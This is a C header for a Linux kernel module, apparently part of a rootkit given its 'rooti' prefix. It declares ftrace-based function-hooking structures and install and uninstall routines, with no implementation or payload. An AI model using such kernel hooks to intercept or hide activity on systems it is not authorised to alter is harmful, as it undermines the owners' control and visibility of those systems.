#ifndef _ROOTI_HOOKING_H
#define _ROOTI_HOOKING_H

#include <linux/ftrace.h>
#include <linux/list.h>
#include "config.h"

#ifndef ROOTI_USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

#define ROOTI_FUNC_HOOK(_name, _hook, _orig) \
{ \
    .name = (_name), \
    .func = (_hook), \
    .orig = (_orig)  \
}

struct rooti_func_hook {
    char *name;               // hooked function name
    void *func;               // pointer to hook function
    void *orig;               // pointer to original function
    unsigned long addr;       // real memory address of the original function
    struct ftrace_ops ops;
    struct list_head list;
};

int rooti_install_func_hook(struct rooti_func_hook *hook);
int rooti_install_func_hooks(struct rooti_func_hook *hooks, size_t count);
void rooti_uninstall_func_hook(struct rooti_func_hook *hook);
void rooti_uninstall_func_hooks(struct rooti_func_hook *hooks, size_t count);

extern struct list_head rooti_active_hooks;

#endif
